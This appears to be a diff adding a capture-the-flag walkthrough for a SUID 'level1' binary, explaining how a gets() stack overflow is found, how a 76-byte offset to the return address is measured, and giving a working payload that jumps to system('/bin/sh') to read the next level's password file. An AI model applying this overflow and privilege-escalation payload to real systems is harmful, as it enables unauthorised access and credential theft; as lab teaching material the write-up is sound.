@@ -1,0 +1,245 @@
+## Initial Analysis
+
+The binary is owned by the next user and has the SUID bit set:
+
+```bash
+-rwsr-s--- 1 level2 users ...
+```
+
+Like level0, the objective is to execute a shell with the privileges of `level2` and read its password file.
+
+Running the program:
+
+```bash
+./level1
+echo $?
+```
+
+returns:
+
+```text
+1
+```
+
+The program waits for input from `stdin` and exits normally after receiving it.
+
+I tried several random inputs, but nothing interesting happened:
+
+```bash
+echo "test" | ./level1
+echo $?
+```
+
+```text
+0
+```
+
+No output and no crash.
+
+---
+
+## Looking for Interesting Strings
+
+I inspected the binary and found the string:
+
+```text
+Good... Wait what?
+```
+
+At first, I thought it might be a password or special input, but it was not useful.
+
+---
+
+## Disassembling main()
+
+Using GDB:
+
+```bash
+echo "disas main" | gdb level1
+```
+
+I found the following instructions:
+
+```asm
+sub    $0x50,%esp
+...
+call   gets@plt
+```
+
+The program reserves `0x50` bytes on the stack and then calls `gets()`.
+
+Since `gets()` performs no bounds checking, this immediately suggests a stack buffer overflow vulnerability.
+
+---
+
+## Searching for Useful Code
+
+Instead of injecting shellcode, I searched for existing code that already executes a shell.
+
+```bash
+objdump -d level1 | grep system
+```
+
+This revealed:
+
+```asm
+movl   $0x8048584,(%esp)
+call   system@plt
+```
+
+Inspecting the argument:
+
+```gdb
+x/s 0x8048584
+```
+
+shows:
+
+```text
+0x8048584: "/bin/sh"
+```
+
+Therefore, the binary already contains:
+
+```c
+system("/bin/sh");
+```
+
+The goal becomes redirecting execution flow to this code.
+
+---
+
+## Understanding the Stack Layout
+
+Although the function reserves `0x50` bytes:
+
+```asm
+sub $0x50,%esp
+```
+
+the buffer itself begins at:
+
+```asm
+lea 0x10(%esp), %eax
+```
+
+Therefore:
+
+```text
+0x50 - 0x10 = 0x40
+```
+
+```text
+Buffer size = 64 bytes
+```
+
+---
+
+## Finding the Offset
+
+To determine where the saved return address is located, I ran the program inside GDB with a recognizable pattern:
+
+```text
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+```
+
+After the crash:
+
+```gdb
+info registers
+```
+
+I found:
+
+```text
+eip = 0x54545454
+```
+
+which corresponds to:
+
+```text
+TTTT
+```
+
+This proves that the saved EIP is overwritten by `"TTTT"`.
+
+The offset to EIP is therefore:
+
+```text
+64 bytes buffer
++ 8 bytes compiler padding
++ 4 bytes saved EBP
+----------------------
+76 bytes
+```
+
+---
+
+## Stack Layout
+
+```text
+HIGH ADDRESS
+──────────────────────
+| RET to caller      |  <-- [ebp+4]
+──────────────────────
+| Saved EBP          |  <-- [ebp]
+──────────────────────
+| Compiler padding   |
+|      8 bytes       |
+──────────────────────
+|                    |
+| Local buffer       |
+|     64 bytes       |
+| gets() writes here |
+──────────────────────
+| Alignment space    |
+|     16 bytes       |
+──────────────────────
+LOW ADDRESS
+```
+
+---
+
+## Redirecting Execution
+
+The useful code is located at:
+
+```text
+0x08048472
+```
+
+which executes:
+
+```c
+system("/bin/sh");
+```
+
+We need:
+
+```text
+76 bytes padding
++
+0x08048472
+```
+
+Because x86 is little-endian, the address must be written as:
+
+```text
+\x72\x84\x04\x08
+```
+
+---
+
+## Final Exploit
+
+```bash
+(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" + "\x72\x84\x04\x08"'; cat) | ./level1
+```
+
+The `cat` command keeps `stdin` open after the overflow. Without it, `/bin/sh` would immediately receive EOF and terminate.
+
+Once the shell is spawned, it runs with the privileges of `level2`, allowing access to:
+
+```bash
+cat /home/user/level2/.pass
+```
